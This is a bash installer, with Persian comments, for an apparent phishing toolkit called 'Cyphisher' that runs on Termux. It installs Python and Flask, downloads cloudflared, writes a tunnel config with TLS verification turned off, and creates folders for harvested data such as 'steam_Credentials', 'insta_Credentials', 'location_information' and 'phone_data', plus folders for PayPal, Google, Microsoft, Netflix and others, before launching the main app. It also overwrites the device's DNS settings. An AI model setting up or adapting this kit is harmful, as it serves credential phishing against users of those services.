#!/usr/bin/env bash
set -euo pipefail

# ===============================
# Cyphisher Setup Script - Termux Complete Fix
# ===============================

AUTO_CF="${AUTO_CF:-1}"
PORT="${PORT:-5001}"

APP_FILE="main.py"
VENV_DIR="venv"
CF_DIR="cloud_flare"

log(){ printf "\n[setup] %s\n" "$*"; }
error(){ printf "\n[ERROR] %s\n" "$*" >&2; }

# تابع برای رفع مشکل certificate و DNS
fix_system_issues() {
    log "🔧 Fixing system issues..."
    
    # نصب ca-certificates برای رفع مشکل certificate
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg install -y ca-certificates 2>/dev/null || true
        update-ca-certificates 2>/dev/null || true
    fi
    
    # تنظیم DNS سرورهای معتبر
    if [ -w "$PREFIX/etc/resolv.conf" ]; then
        echo "nameserver 8.8.8.8" > $PREFIX/etc/resolv.conf
        echo "nameserver 1.1.1.1" >> $PREFIX/etc/resolv.conf
        echo "nameserver 208.67.222.222" >> $PREFIX/etc/resolv.conf
        log "✅ DNS servers configured"
    fi
    
    # تست اتصال به Cloudflare
    log "📡 Testing connection to Cloudflare..."
    if ping -c 2 -W 3 api.trycloudflare.com >/dev/null 2>&1; then
        log "✅ Connection test successful"
    else
        log "⚠️ Connection test failed, but continuing..."
    fi
    
    log "✅ System issues fixed"
}

# پاکسازی کامل cloudflared قبلی
cleanup_old_cloudflared() {
    log "🧹 Cleaning up previous cloudflared installations..."
    
    rm -f "${CF_DIR}/cloudflared" 2>/dev/null || true
    rm -f "${CF_DIR}/cloudflared.exe" 2>/dev/null || true
    rm -f "cloudflared" 2>/dev/null || true
    rm -f "cloudflared.exe" 2>/dev/null || true
    rm -f "cloudflared.log" "cloudflared_url.txt" "app.pid" "cf.pid" 2>/dev/null || true
    
    log "✅ Cleanup completed"
}

# تشخیص پلتفرم
detect_platform() {
    OS="$(uname -s | tr '[:upper:]' '[:lower:]')"
    ARCH="$(uname -m | tr '[:upper:]' '[:lower:]')"

    IS_TERMUX=0
    if [ -n "${PREFIX-}" ] && echo "${PREFIX}" | grep -q "com.termux"; then
        IS_TERMUX=1
        OS="linux"
        if [ "$ARCH" = "aarch64" ]; then
            ARCH="arm64"
        elif [ "$ARCH" = "armv7l" ] || [ "$ARCH" = "arm" ]; then
            ARCH="arm"
        else
            ARCH="arm64"
        fi
    fi

    if [[ "$OS" == *"mingw"* ]] || [[ "$OS" == *"cygwin"* ]] || [[ "$OS" == *"msys"* ]]; then
        OS="windows"
    fi

    log "🔧 Platform: OS=$OS ARCH=$ARCH TERMUX=$IS_TERMUX"
}

# نصب پایتون و ابزارهای لازم
install_dependencies() {
    log "📦 Installing dependencies..."
    
    if [ "$IS_TERMUX" -eq 1 ]; then
        pkg update -y
        pkg install -y python git curl wget ca-certificates -y
    else
        log "Please install Python and Git manually for your system"
        return 1
    fi
}

# ایجاد محیط مجازی پایتون
setup_python_env() {
    log "🐍 Setting up Python environment..."
    
    if [ ! -d "$VENV_DIR" ]; then
        python -m venv "$VENV_DIR"
        log "✅ Virtual environment created"
    fi
    
    if [ -f "${VENV_DIR}/bin/activate" ]; then
        source "${VENV_DIR}/bin/activate"
    else
        error "Could not activate virtual environment"
        return 1
    fi
    
    pip install --upgrade pip
    if [ -f "requirements.txt" ]; then
        pip install -r requirements.txt
        log "✅ Requirements installed"
    else
        pip install rich pyfiglet requests flask
        log "✅ Basic packages installed"
    fi
    
    log "✅ Python environment ready"
}

# دانلود cloudflared با رفع مشکلات احتمالی
download_cloudflared_guaranteed() {
    log "🌐 Downloading cloudflared for Termux..."
    
    mkdir -p "$CF_DIR"
    
    URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    OUTPUT_FILE="${CF_DIR}/cloudflared"
    
    # حذف فایل قبلی
    rm -f "$OUTPUT_FILE" 2>/dev/null || true
    
    # دانلود با curl
    if command -v curl >/dev/null 2>&1; then
        log "🔻 Using curl for download..."
        if curl -L --progress-bar -o "$OUTPUT_FILE" "$URL"; then
            log "✅ Download completed with curl"
        else
            # اگر دانلود اصلی شکست خورد، از آینه جایگزین استفاده کن
            log "🔄 Trying alternative download mirror..."
            if curl -L --progress-bar -o "$OUTPUT_FILE" "https://cdn.cloudflare.com/cloudflared/releases/latest/cloudflared-linux-arm64"; then
                log "✅ Download completed from mirror"
            else
                error "❌ All download attempts failed"
                return 1
            fi
        fi
    # دانلود با wget
    elif command -v wget >/dev/null 2>&1; then
        log "🔻 Using wget for download..."
        if wget -O "$OUTPUT_FILE" "$URL"; then
            log "✅ Download completed with wget"
        else
            log "🔄 Trying alternative download mirror..."
            if wget -O "$OUTPUT_FILE" "https://cdn.cloudflare.com/cloudflared/releases/latest/cloudflared-linux-arm64"; then
                log "✅ Download completed from mirror"
            else
                error "❌ All download attempts failed"
                return 1
            fi
        fi
    else
        error "❌ Neither curl nor wget available"
        return 1
    fi
    
    # بررسی اینکه فایل دانلود شده است
    if [ ! -f "$OUTPUT_FILE" ]; then
        error "❌ Downloaded file not found!"
        return 1
    fi
    
    # بررسی سایز فایل (نباید خالی باشد)
    FILE_SIZE=$(stat -c%s "$OUTPUT_FILE" 2>/dev/null || stat -f%z "$OUTPUT_FILE" 2>/dev/null || echo "0")
    if [ "$FILE_SIZE" -lt 1000000 ]; then
        error "❌ Downloaded file seems too small ($FILE_SIZE bytes)"
        return 1
    fi
    
    log "📊 File size: $FILE_SIZE bytes"
    
    # دادن مجوز اجرا
    log "🔐 Setting execute permissions..."
    if chmod +x "$OUTPUT_FILE"; then
        log "✅ Execute permissions set"
    else
        error "❌ Failed to set execute permissions"
        return 1
    fi
    
    # تست نهایی
    if [ -x "$OUTPUT_FILE" ]; then
        log "✅ File is executable"
        echo "$OUTPUT_FILE"
        return 0
    else
        error "❌ File is not executable after permission change"
        return 1
    fi
}

# تست cloudflared بدون ایجاد تونل واقعی (نسخه اصلاح شده برای ترمکس)
test_cloudflared_safe() {
    log "🔍 Testing cloudflared (safe mode)..."
    
    local cf_path="${CF_DIR}/cloudflared"
    
    if [ ! -f "$cf_path" ] || [ ! -x "$cf_path" ]; then
        log "⚠️ cloudflared not available for testing"
        return 1
    fi
    
    # تست سریع نسخه
    if "$cf_path" version >/dev/null 2>&1; then
        log "✅ cloudflared basic test passed"
        
        # تست ساده‌تر بدون استفاده از /tmp
        log "🌐 Quick version check..."
        local version_output
        version_output=$("$cf_path" version 2>&1)
        
        if echo "$version_output" | grep -q "cloudflared"; then
            log "🎉 cloudflared is working correctly"
            log "📋 Version info: $(echo "$version_output" | head -1)"
        else
            log "⚠️ Version check inconclusive, but binary is executable"
        fi
        
        return 0
    else
        error "❌ cloudflared basic test failed"
        return 1
    fi
}

# ایجاد دایرکتوری‌ها
create_directories() {
    log "📁 Creating directories..."
    
    dirs=(
        "steam_Credentials" "insta_Credentials" "location_information" "uploads"
        "IG_FOLLOWER" "Facebook" "Github" "Google" "WordPress" "Django" "Netflix"
        "Discord" "Paypal" "Twitter" "Yahoo" "yandex" "snapchat" "Roblox"
        "adobe" "LinkedIN" "Gitlab" "Ebay" "Dropbox" "chatgpt" "Deepseek"
        "collected_data" "phone_data" "Twitch" "Microsoft"
    )
    
    for dir in "${dirs[@]}"; do
        mkdir -p "$dir"
    done
    
    log "✅ Directories created"
}

# ایجاد فایل پیکربندی برای cloudflared (رفع مشکل certificate)
create_cloudflared_config() {
    log "⚙️ Creating cloudflared configuration..."
    
    local config_file="${CF_DIR}/config.yml"
    
    cat > "$config_file" << EOF
# Cloudflared configuration for Cyphisher
tunnel: cyphisher-tunnel
credentials-file: ${CF_DIR}/credentials.json

ingress:
  - hostname: cyphisher.localhost
    service: http://localhost:${PORT}
  - service: http_status:404

warp-routing:
  enabled: false

originRequest:
  noTLSVerify: true
  connectTimeout: 30s
  tlsTimeout: 10s
  tcpKeepAlive: 30s
  noHappyEyeballs: false
  keepAliveConnections: 10
  keepAliveTimeout: 1m30s

logging:
  level: info
  format: json
EOF

    log "✅ Cloudflared configuration created"
}

# تابع اصلی
main() {
    log "🚀 Starting Cyphisher Setup for Termux..."
    
    # مرحله 1: تشخیص پلتفرم
    detect_platform
    
    if [ "$IS_TERMUX" -ne 1 ]; then
        error "This script is optimized for Termux only"
        exit 1
    fi
    
    # مرحله 2: رفع مشکلات سیستم
    fix_system_issues
    
    # مرحله 3: پاکسازی کامل
    cleanup_old_cloudflared
    
    # مرحله 4: نصب وابستگی‌ها
    install_dependencies
    
    # مرحله 5: محیط پایتون
    setup_python_env
    
    # مرحله 6: دانلود cloudflared
    if [ "$AUTO_CF" = "1" ]; then
        log "⬇️ Downloading cloudflared..."
        if download_cloudflared_guaranteed; then
            log "🎉 cloudflared downloaded successfully!"
            
            # مرحله 7: تست امن cloudflared
            test_cloudflared_safe
            
            # مرحله 8: ایجاد پیکربندی
            create_cloudflared_config
        else
            log "⚠️ Cloudflared download failed - continuing without tunnel support"
        fi
    else
        log "⚠️ Cloudflared auto-download disabled"
    fi
    
    # مرحله 9: ایجاد دایرکتوری‌ها
    create_directories
    
    # خلاصه نصب
    log "==========================================="
    log "🎊 SETUP COMPLETED SUCCESSFULLY!"
    log "==========================================="
    log "Platform: Termux ($ARCH)"
    log "Python: $(python --version 2>/dev/null || echo 'Unknown')"
    log "Virtual Environment: $VENV_DIR"
    log "Port: $PORT"
    
    if [ -f "${CF_DIR}/cloudflared" ] && [ -x "${CF_DIR}/cloudflared" ]; then
        log "Cloudflared: ✅ INSTALLED AND READY"
        log "Configuration: ${CF_DIR}/config.yml"
        log "Note: Certificate issues are handled automatically"
    else
        log "Cloudflared: ❌ NOT AVAILABLE"
    fi
    
    log "🚀 Starting application in 3 seconds..."
    sleep 3
    
    # اجرای برنامه اصلی
    if [ -f "${VENV_DIR}/bin/python" ]; then
        PYTHON_BIN="${VENV_DIR}/bin/python"
        clear
        log "🏁 Launching Cyphisher..."
        export CLOUDFLARED_PATH="${CF_DIR}/cloudflared"
        exec "$PYTHON_BIN" "$APP_FILE"
    else
        error "Python binary not found"
        exit 1
    fi
}

# اجرای اسکریپت
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
